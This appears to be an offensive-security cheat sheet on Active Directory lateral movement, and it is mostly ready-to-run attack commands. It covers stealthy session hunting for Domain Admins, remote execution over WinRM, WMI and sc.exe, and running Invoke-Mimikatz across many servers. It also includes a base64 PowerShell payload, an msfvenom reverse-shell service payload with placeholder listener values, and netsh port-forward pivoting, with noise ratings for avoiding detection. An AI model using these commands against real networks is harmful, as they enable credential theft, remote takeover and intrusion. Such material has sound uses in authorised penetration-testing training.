# 04 — Local Admin Hunting + Lateral Movement

> [!TIP]
> Lateral movement involves pivoting from an initial compromise to other systems across the Active Directory environment using local administrator privileges or valid domain credentials.

---

## Lateral Movement Technique Matrix

| Method | Protocol / Ports | Requirements | OPSEC / Noise Level |
| :--- | :--- | :--- | :--- |
| **WinRM / PSRemoting** | HTTP (5985) / HTTPS (5986) | Local Admin / Remote Management Users | **Low** (Native Windows administrative traffic) |
| **WMI (wmic / Invoke-WmiMethod)** | RPC (135) + Dynamic RPC (49152+) | Local Admin rights | **Low/Medium** (Native WMI event creation) |
| **Service Control (sc.exe / SCM)** | SMB (445) / RPC | Local Admin rights | **Medium** (Creates temporary service & binary) |
| **PsExec** | SMB (445) | Local Admin + Administrative Shares (`ADMIN$`) | **High** (Creates PSEXECSVC service & writes binary to disk) |
| **DCOM (MMC20.Application)** | RPC (135) | Local Admin rights | **Medium** (Instantiates COM objects remotely) |

---

## Session Hunting & Admin Target Discovery

Session hunting locates machines where privileged domain users (e.g. Domain Admins) have active sessions, providing target paths for credential theft and lateral movement.

```powershell
# PowerView: Find active sessions across domain computers
Invoke-SessionHunter

# Session Hunter optimized for stealth (No port scan, raw results)
Invoke-SessionHunter -NoPortScan -RawResults

# Locate machines where specific Domain Admin users are logged on
Find-DomainUserLocation
```

---

## WinRM & PSRemoting Lateral Movement

WinRM (Windows Remote Management) provides PowerShell Remoting capabilities.

### 1-to-1 Interactive Session
```cmd
# WinRS interactive command shell
winrs -r:<TARGET_HOST> cmd
```

```powershell
# Interactive PowerShell Remoting session
Enter-PSSession -ComputerName <TARGET_HOST>
```

### 1-to-Many Script Execution
```powershell
# Execute scriptblock concurrently across multiple remote hosts
Invoke-Command -ScriptBlock { Get-Process } -ComputerName (Get-Content .\servers.txt)

# Execute local script remotely on target computers
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -ComputerName (Get-Content .\servers.txt)
```

```cmd
# Check session context upon gaining remote access
winrs -r:<TARGET_HOST> cmd
C:\> set username
C:\> set computername
```

---

## WMI & Service Manager Remote Execution

WMI (Windows Management Instrumentation) allows command execution without dropping service binaries to disk.

```powershell
# Execute process remotely via WMI (PowerView / WMI cmdlet)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c powershell.exe -e <BASE64_PAYLOAD>' -ComputerName <TARGET_HOST>

# WMI command execution via PowerShell CIM cmdlet
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'} -ComputerName <TARGET_HOST>
```

---

## PsExec & Remote Service Creation

Service Control Manager (SCM) allows creation of remote services to execute commands under `NT AUTHORITY\SYSTEM`.

```cmd
# Create and start a remote service using sc.exe
sc.exe \\<TARGET_HOST> create <SERVICE_NAME> binPath= "C:\Windows\<PAYLOAD>.exe" start= auto
sc.exe \\<TARGET_HOST> start <SERVICE_NAME>
```

> [!WARNING]
> **Payload Requirement:** Binaries executed by `sc.exe` must communicate with the Windows Service Control Manager (e.g. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service`). Standard executables will time out and fail.

---

## Network Pivoting & Windows Netsh Portproxy

When isolated subnet hosts are unreachable directly from the attacker box, configure port forwarding on an intermediate dual-homed machine using native Windows `netsh`.

### Portproxy Setup Commands

```cmd
# Add port forwarding rule (Listen on local port, forward to remote target IP:Port)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=10.10.10.50

# View all active portproxy rules
netsh interface portproxy show all

# Reset / Delete portproxy rule after operation
netsh interface portproxy reset
```
